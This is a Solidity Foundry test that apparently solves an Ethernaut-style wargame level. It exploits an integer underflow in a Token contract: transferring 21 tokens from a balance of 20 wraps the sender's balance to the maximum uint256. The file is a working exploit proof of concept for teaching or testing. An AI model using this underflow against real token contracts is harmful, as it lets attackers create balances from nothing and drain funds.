// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract TokenTest is Test {
    IToken token;
    address player = address(this);
    address recipient = address(0x123);

    function setUp() public {
        // Deploy the Token contract with initial balance of 20
        token = IToken(deployCode("Token.sol", abi.encode(20)));
    }

    function testTokenExploit() public {
        // PHASE 1: Check initial balance
        uint256 initialBalance = token.balanceOf(player);
        assertEq(initialBalance, 20, "Initial balance should be 20");

        // PHASE 2: Trigger underflow by transferring more than balance
        bool success = token.transfer(recipient, 21);
        require(success, "Transfer should succeed but cause underflow");

        // PHASE 3: Verify underflow occurred (balance becomes huge)
        uint256 newBalance = token.balanceOf(player);
        assertGt(newBalance, initialBalance, "Balance should underflow to max value");
        assertEq(newBalance, type(uint256).max, "Balance should underflow to max uint256 value");
    }
}